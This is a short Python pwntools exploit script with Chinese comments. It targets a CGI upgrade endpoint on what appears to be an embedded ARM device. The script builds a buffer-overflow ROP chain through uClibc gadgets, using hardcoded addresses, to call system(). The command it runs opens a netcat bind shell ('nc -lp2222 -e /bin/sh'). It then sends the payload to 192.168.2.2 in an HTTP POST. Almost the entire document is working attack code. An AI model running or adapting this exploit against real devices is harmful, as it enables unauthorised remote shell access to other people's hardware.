#!/usr/bin/python

from pwn import *

libc_base = 0xb6f2d000  # libC 库在内存中的加载地址
stack_base = 0xbeffeb70 # 崩溃时 SP 寄存器的地址
libc_elf = ELF('libuClibc-0.9.33.3-git.so')

payload = (0x38 - 4) * 'a' # padding
payload +=  p32(0x00048784 + libc_base) # gadget1 pop {r1, pc} 
payload += p32(0x80 + stack_base) # 栈中命令参数地址
payload += p32(0x00016aa4 + libc_base) # gadget2 mov r0, r1 ; pop {r4, r5, pc}
payload += (0x8 * 'a')  # padding
payload += p32(libc_elf.symbols['system'] + libc_base) # 内存中 system() 函数地址
payload += ('pwd;' * 0x100 + 'nc\x20-lp2222\x20-e/bin/sh\x20>') # 命令参数

payload = 'echo -en "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:{}\n\r\n\r\n"  | nc -v 192.168.2.2 80'.format(payload)
